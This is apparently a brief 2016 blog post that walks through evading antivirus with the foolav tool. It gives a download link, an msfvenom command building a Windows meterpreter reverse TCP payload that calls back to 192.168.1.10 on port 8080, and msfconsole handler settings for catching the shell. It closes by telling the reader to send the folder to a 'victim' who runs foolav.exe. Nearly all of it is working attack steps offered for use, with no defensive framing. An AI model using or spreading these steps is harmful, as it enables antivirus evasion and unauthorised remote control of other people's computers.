---
title: Bypass Antivirus via foolav
date: 2016-05-26 16:54:15
tags: foolav
---
#### Download
[foolav](https://github.com/hvqzao/foolav/releases/download/v1.0/foolav.zip)
#### Start msfvenom

```
>msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=8080 -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" > foolav.mf
```
#### cp foolav.mf to foolav directory
#### Start msf cosole
```
> msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
msf exploit(handler) > set LPORT 8080
LPORT => 8080
msf exploit(handler) > exploit -j
```
#### send foolav foler to your victim :)
#### windows victim run foolav.exe :)